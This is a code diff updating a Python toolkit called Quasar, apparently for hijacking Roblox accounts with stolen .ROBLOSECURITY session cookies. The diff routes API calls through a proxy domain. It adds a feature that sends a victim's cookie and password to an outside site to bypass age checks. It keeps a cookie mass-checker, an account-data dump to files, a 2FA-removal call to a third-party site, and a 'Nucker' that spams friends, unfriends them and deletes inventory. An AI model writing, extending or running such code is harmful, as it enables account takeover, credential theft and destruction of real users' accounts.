@@ -121,7 +121,7 @@ print("LOADED MODULES!")
 year = time.localtime().tm_year
 day = time.localtime().tm_mday
 month = time.localtime().tm_mon
-version = "2.1.2"
+version = "2.1.3"
 cookies_folder = "cookies"
 ## STARTING ##
 
@@ -132,17 +132,17 @@ def getBanner():
 	
 	bannerLogo = """
                                                                        
-  █████   █    ██  ▄▄▄        ██████  ▄▄▄       ██▀███  
-▒██▓  ██▒ ██  ▓██▒▒████▄    ▒██    ▒ ▒████▄    ▓██ ▒ ██▒
-▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ░ ▓██▄   ▒██  ▀█▄  ▓██ ░▄█ ▒
-░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██   ▒   ██▒░██▄▄▄▄██ ▒██▀▀█▄  
-░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██████▒▒ ▓█   ▓██▒░██▓ ▒██▒
-░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░
- ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░▒  ░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░
-   ░   ░  ░░░ ░ ░   ░   ▒   ░  ░  ░    ░   ▒     ░░   ░ 
-    ░       ░           ░  ░      ░        ░  ░   ░     
-                                                        
-            Made With Love By 0x256                                                     
+          █████   █    ██  ▄▄▄        ██████  ▄▄▄       ██▀███  
+        ▒██▓  ██▒ ██  ▓██▒▒████▄    ▒██    ▒ ▒████▄    ▓██ ▒ ██▒
+        ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ░ ▓██▄   ▒██  ▀█▄  ▓██ ░▄█ ▒
+        ░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██   ▒   ██▒░██▄▄▄▄██ ▒██▀▀█▄  
+        ░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██████▒▒ ▓█   ▓██▒░██▓ ▒██▒
+        ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░
+         ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░▒  ░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░
+         ░   ░  ░░░ ░ ░   ░   ▒   ░  ░  ░    ░   ▒     ░░   ░ 
+             ░       ░           ░  ░      ░        ░  ░   ░     
+                                                                
+                      Made With Love By 0x256                                                     
 """
 
 	banner = Colorate.Vertical(Colors.purple_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
@@ -208,7 +208,7 @@ def masscheck():
         newfileforinvalid = open(pathnameforinvalid, "w")
         newfileforinvalid.truncate(0)
         for line in cookie:
-            check = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': str(line)})
+            check = requests.get('https://accountsettings.roproxy.com/v1/email', cookies={'.ROBLOSECURITY': str(line)})
             if check.status_code == 200:
                 newfileforvalid.write("[VALID]: " + str(line) + "\n")
                 validcount += 1
@@ -229,7 +229,9 @@ def masscheck():
         os.system("clear")
     print(getBanner())
     GetNumber()
-def bypass(cookie, type):
+
+#using website cuz im lazy
+def bypass(cookie, type, password="12345678"):
     if type == "RemoveAll":
         url = "https://immortal.rs/dashboard/api/misc/2faBypass.php"
         requests.Timeout = 999999999
@@ -280,6 +282,35 @@ def bypass(cookie, type):
         except requests.exceptions.RequestException as e:
             return e
             os.system("pause")
+
+    if type == "18+":
+        url = "https://rbx-tool.com/apis/bypassAge"
+        requests.Timeout = 999999999
+        headers = {
+            'Content-Type': 'application/json'
+        }
+        payload = {
+            "cookie":cookie,
+            "password":password,
+            "directory":""
+        }
+
+        try:
+            response = requests.post(
+                url,
+                headers=headers,
+                data=json.dumps(payload)
+            )
+            
+            response.raise_for_status()
+            data = response.json()
+            return data
+            os.system("pause")
+        except requests.exceptions.RequestException as e:
+            return e
+            os.system("pause")
+
+
     os.system("pause")
     time.sleep(5)
     if os.name == "nt":
@@ -330,12 +361,12 @@ def BuyAll():
 
 
         def purchase(name: str, product_id: int) -> None:
-            req = session.post("https://auth.roblox.com/v2/login")
+            req = session.post("https://auth.roproxy.com/v2/login")
             csrf_token = req.headers["x-csrf-token"]
 
             while True:
                 req = session.post(
-                    f"https://economy.roblox.com/v1/purchases/products/{product_id}",
+                    f"https://economy.roproxy.com/v1/purchases/products/{product_id}",
                     json={"expectedCurrency": 1, "expectedPrice": 0, "expectedSellerId": 1},
                     headers={"X-CSRF-TOKEN": csrf_token},
                 )
@@ -386,7 +417,7 @@ def Pin_Cracker():
 def Nucker():
     def getXsrf(cookie):
         xsrfRequest = requests.post(
-            "https://auth.roblox.com/v2/logout", cookies={".ROBLOSECURITY": cookie}
+            "https://auth.roproxy.com/v2/logout", cookies={".ROBLOSECURITY": cookie}
         )
         return xsrfRequest.headers["x-csrf-token"]
 
@@ -416,13 +447,13 @@ def Nucker():
             try:
                 while True:
                     requests.patch(
-                        "https://accountsettings.roblox.com/v1/themes/user",
+                        "https://accountsettings.roproxy.com/v1/themes/user",
                         cookies={".ROBLOSECURITY": str(self.cookie)},
                         headers=self.headers,
                         data={"themeType": "Light"},
                     )
                     requests.patch(
-                        "https://accountsettings.roblox.com/v1/themes/user",
+                        "https://accountsettings.roproxy.com/v1/themes/user",
                         cookies={".ROBLOSECURITY": str(self.cookie)},
                         headers=self.headers,
                         data={"themeType": "Dark"},
@@ -438,13 +469,13 @@ def Nucker():
         def changeLanguage(self):
             while True:
                 requests.post(
-                    "https://locale.roblox.com/v1/locales/set-user-supported-locale",
+                    "https://locale.roproxy.com/v1/locales/set-user-supported-locale",
                     cookies={".ROBLOSECURITY": str(self.cookie)},
                     headers=self.headers,
                     data={"supportedLocaleCode": "ja_jp"},
                 )
                 requests.post(
-                    "https://locale.roblox.com/v1/locales/set-user-supported-locale",
+                    "https://locale.roproxy.com/v1/locales/set-user-supported-locale",
                     cookies={".ROBLOSECURITY": str(self.cookie)},
                     headers=self.headers,
                     data={"supportedLocaleCode": "ko_kr"},
@@ -456,13 +487,13 @@ def Nucker():
             print("] ", end="")
             cprint("Messaging friends....", "magenta")
             conversations = requests.get(
-                "https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=3000",
+                "https://chat.roproxy.com/v2/get-user-conversations?pageNumber=1&pageSize=3000",
                 cookies={".ROBLOSECURITY": str(self.cookie)},
                 headers=self.headers,
             ).json()
             for conversation in conversations:
                 requests.post(
-                    "https://chat.roblox.com/v2/send-message",
+                    "https://chat.roproxy.com/v2/send-message",
                     data={"conversationId": conversation["id"], "message": message},
                     cookies={".ROBLOSECURITY": str(self.cookie)},
                     headers=self.headers,
@@ -474,7 +505,7 @@ def Nucker():
 
         def removeItems(self):
             items = requests.get(
-                f"https://www.roblox.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={self.userid}",
+                f"https://www.roproxy.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={self.userid}",
                 cookies={".ROBLOSECURITY": str(self.cookie)},
                 headers=self.headers,
             ).json()["Data"]["Items"]
@@ -482,7 +513,7 @@ def Nucker():
                 time.sleep(4)
                 id = item["Item"]["AssetId"]
                 response = requests.post(
-                    "https://www.roblox.com/asset/delete-from-inventory",
+                    "https://www.roproxy.com/asset/delete-from-inventory",
                     data={"assetId": str(id)},
                     cookies={".ROBLOSECURITY": str(self.cookie)},
                     headers=self.headers,
@@ -490,7 +521,7 @@ def Nucker():
                 if response.status_code == 429:
                     time.sleep(10)
                     response = requests.post(
-                        "https://www.roblox.com/asset/delete-from-inventory",
+                        "https://www.roproxy.com/asset/delete-from-inventory",
                         data={"assetId": id},
                         cookies={".ROBLOSECURITY": str(self.cookie)},
                         headers=self.headers,
@@ -516,7 +547,7 @@ def Nucker():
             print("] ", end="")
             cprint("Unfriending friends....", "magenta")
             friends = requests.get(
-                f"https://friends.roblox.com/v1/users/{self.userid}/friends",
+                f"https://friends.roproxy.com/v1/users/{self.userid}/friends",
                 cookies={".ROBLOSECURITY": str(self.cookie)},
             ).json()["data"]
             friendIds = [friend["id"] for friend in friends]
@@ -524,7 +555,7 @@ def Nucker():
                 time.sleep(0.1)
                 print(
                     requests.post(
-                        f"https://friends.roblox.com/v1/users/{i}/unfriend",
+                        f"https://friends.roproxy.com/v1/users/{i}/unfriend",
                         cookies={".ROBLOSECURITY": str(self.cookie)},
                         headers=self.headers,
                     ).text
@@ -550,7 +581,7 @@ def Nucker():
             cprint("Enter Your mass dm message below:", "magenta")
             self.message = input("> ")
             return requests.get(
-                "https://chat.roblox.com/v2/get-unread-conversation-count",
+                "https://chat.roproxy.com/v2/get-unread-conversation-count",
                 cookies={".ROBLOSECURITY": str(self.cookie)},
             )
 
@@ -560,7 +591,7 @@ def Nucker():
             if check.status_code == 200:
                 self.headers = {"X-CSRF-TOKEN": getXsrf(self.cookie)}
                 userdata = requests.get(
-                    "https://users.roblox.com/v1/users/authenticated",
+                    "https://users.roproxy.com/v1/users/authenticated",
                     cookies={".ROBLOSECURITY": self.cookie},
                 ).json()  # get user data
                 self.userid = userdata["id"]  # user id
@@ -599,9 +630,9 @@ def GruupFind():
         def groupfinder(suma):
             try:
                 id = random.randint(1000000, 1150000)
-                r = requests.get(f"https://www.roblox.com/groups/group.aspx?gid={id}", timeout=30)
+                r = requests.get(f"https://www.roproxy.com/groups/group.aspx?gid={id}", timeout=30)
                 if 'owned' not in r.text:
-                    re = requests.get(f"https://groups.roblox.com/v1/groups/{id}", timeout=30)
+                    re = requests.get(f"https://groups.roproxy.com/v1/groups/{id}", timeout=30)
                     if re.status_code != 429:
                         if 'errors' not in re.json():
                             if 'isLocked' not in re.text and 'owner' in re.text:
@@ -651,55 +682,55 @@ def download_file(url, filepath):
 
 
 def check(cookie):
-  check = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': cookie})
+  check = requests.get('https://accountsettings.roproxy.com/v1/email', cookies={'.ROBLOSECURITY': cookie})
   if check.status_code == 200:
-    Emmail = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': str(cookie)}).json()
+    Emmail = requests.get('https://accountsettings.roproxy.com/v1/email', cookies={'.ROBLOSECURITY': str(cookie)}).json()
     email = Emmail['verified']
     EmailName = Emmail['emailAddress']
     Write.Print(f"[Process] Get email...\n", Colors.purple, interval=0.0025)
-    credit = requests.get("https://billing.roblox.com/v1/credit", cookies={'.ROBLOSECURITY': str(cookie)}).json()['balance']
+    credit = requests.get("https://billing.roproxy.com/v1/credit", cookies={'.ROBLOSECURITY': str(cookie)}).json()['balance']
     Write.Print(f"[Process] Get credit...\n", Colors.purple, interval=0.0025)
-    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
-    birthday = requests.get("https://accountinformation.roblox.com/v1/birthdate", cookies={'.ROBLOSECURITY': str(cookie)}).json()
+    userdata = requests.get("https://users.roproxy.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
+    birthday = requests.get("https://accountinformation.roproxy.com/v1/birthdate", cookies={'.ROBLOSECURITY': str(cookie)}).json()
     Write.Print(f"[Process] Get birthday...\n", Colors.purple, interval=0.0025)
     userid = userdata['id'] #user id
-    followers = requests.get(f"https://friends.roblox.com/v1/users/{userid}/followers/count", cookies={'.ROBLOSECURITY': str(cookie)}).json()['count']
+    followers = requests.get(f"https://friends.roproxy.com/v1/users/{userid}/followers/count", cookies={'.ROBLOSECURITY': str(cookie)}).json()['count']
     Write.Print(f"[Process] Get followers...\n", Colors.purple, interval=0.0025)
     Write.Print(f"[Process] Get userId...\n", Colors.purple, interval=0.0025)
 
-    transactions = requests.get(f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=Month&transactionType=summary", cookies={'.ROBLOSECURITY': str(cookie)}, data={'timeFrame':'Month', 'transactionType': 'summary'}).json()
+    transactions = requests.get(f"https://economy.roproxy.com/v2/users/{userid}/transaction-totals?timeFrame=Month&transactionType=summary", cookies={'.ROBLOSECURITY': str(cookie)}, data={'timeFrame':'Month', 'transactionType': 'summary'}).json()
     pending = transactions['pendingRobuxTotal']
     Write.Print(f"[Process] Get Pending...\n", Colors.purple, interval=0.0025)
     stipends = transactions['premiumStipendsTotal']
     Write.Print(f"[Process] Get stipends...\n", Colors.purple, interval=0.0025)
     devEx = transactions['developerExchangeTotal']
     Write.Print(f"[Process] Get DevEX...\n", Colors.purple, interval=0.0025)
-    groups = requests.get(f"https://groups.roblox.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)})
+    groups = requests.get(f"https://groups.roproxy.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)})
     groupIds = [i['group']['id'] for i in groups.json()['data'] if i['group']['owner']['userId'] == userid]
     groupFunds = 0
     for i in groupIds:
-        groupFunds += int(requests.get(f"https://economy.roblox.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])
-    creationDate = requests.get(f'https://users.roblox.com/v1/users/{userid}').json()['created']
+        groupFunds += int(requests.get(f"https://economy.roproxy.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])
+    creationDate = requests.get(f'https://users.roproxy.com/v1/users/{userid}').json()['created']
     display = userdata['displayName'] #display name
     Write.Print(f"[Process] Get Display...\n", Colors.purple, interval=0.0025)
     username = userdata['name'] #username
     Write.Print(f"[Process] Get Username...\n", Colors.purple, interval=0.0025)
-    robuxdata = requests.get(f'https://economy.roblox.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
+    robuxdata = requests.get(f'https://economy.roproxy.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
     robux = robuxdata['robux'] 
     Write.Print(f"[Process] Get Robux...\n", Colors.purple, interval=0.0025)
-    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
-    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
+    premiumbool = requests.get(f'https://premiumfeatures.roproxy.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
+    rap_dict = requests.get(f'https://inventory.roproxy.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
     while rap_dict['nextPageCursor'] != None:
-        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
+        rap_dict = requests.get(f'https://inventory.roproxy.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
     rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
     birthdate = f'{birthday["birthMonth"]}/{birthday["birthDay"]}/{birthday["birthYear"]}'
-    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
+    thumbnail=requests.get(f"https://thumbnails.roproxy.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
     image_url = thumbnail["data"][0]["imageUrl"]
-    pindata = requests.get('https://auth.roblox.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
+    pindata = requests.get('https://auth.roproxy.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
     pin_bool = pindata["isEnabled"] 
 
     print(getBanner())
-    Write.Print(f"Username: {username}, url= https://roblox.com/users/{userid}\n", Colors.purple_to_blue, interval=0.0025)
+    Write.Print(f"Username: {username}, url= https://roproxy.com/users/{userid}\n", Colors.purple_to_blue, interval=0.0025)
     file = f"{username}_cookie.txt"
     with open(file, 'a+') as f:
             f.write(f"Username: {username} | ")
@@ -771,7 +802,7 @@ def check(cookie):
 
 def GetNumber():
     Printing = Colorate.Vertical(Colors.purple_to_blue, Center.XCenter("""
-    [1] Cheats (Quasar)    [ONLINE];                [6] Email validator  [OFFLINE];               [11] Get server IP           [OFFLINE];                 
+    [1] Cheats (Quasar)    [ONLINE];                [6] Email validator  [OFFLINE];               [11] Bypass 18+              [ONLINE];                 
     [2] Cookie checker     [ONLINE];                [7] Nucker           [ONLINE];                [12] Bypass age              [ONLINE];                 
     [3] Immortal           [ONLINE];                [8] BruteForcer      [OFFLINE];               [13] Bypass all              [ONLINE];            
     [4] Roblox Pin cracker [OFFLINE];               [9] free-item-buyer  [ONLINE];                [14] C# QMCC                 [ONLINE];                  
@@ -941,6 +972,7 @@ def GetNumber():
         print('')
         print(getBanner())
         cooke = Write.Input(f"Cookie to bypass: ", Colors.purple_to_blue, interval=0.0025)
+        Write.Print("Bypassing (1-5 minutes)... \n", Colors.purple_to_blue, interval=0.0025)
         Write.Print(bypass(cooke, "Age"), Colors.purple_to_blue, interval=0.0025)
         if os.name == "nt":
             os.system("cls")
@@ -959,7 +991,7 @@ def GetNumber():
             os.system("clear")
         print(getBanner())
         cooke = Write.Input(f"Cookie to bypass: ", Colors.purple_to_blue, interval=0.0025)
-
+        Write.Print("Bypassing (1-5 minutes)... \n", Colors.purple_to_blue, interval=0.0025)
         Write.Print(bypass(cooke, "RemoveAll"), Colors.purple_to_blue, interval=0.0025)
         if os.name == "nt":
             os.system("cls")
@@ -969,6 +1001,26 @@ def GetNumber():
         print(getBanner())
         GetNumber()
 
+    elif Number == 11:
+        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
+         
+        time.sleep(2)
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print(getBanner())
+        cooke = Write.Input(f"Cookie to bypass: ", Colors.purple_to_blue, interval=0.0025)
+        parol = Write.Input(f"Cookie password: ", Colors.purple_to_blue, interval=0.0025)
+        Write.Print("Bypassing (1-5 minutes)... \n", Colors.purple_to_blue, interval=0.0025)
+        Write.Print(bypass(cooke, "18+", parol), Colors.purple_to_blue, interval=0.0025)
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print('')
+        print(getBanner())
+        GetNumber()
     elif Number <=15:
         Write.Input("This feature is disabled or was not implemented in the code. Press any key", Colors.purple_to_blue, interval=0.0025)
         if os.name == "nt":
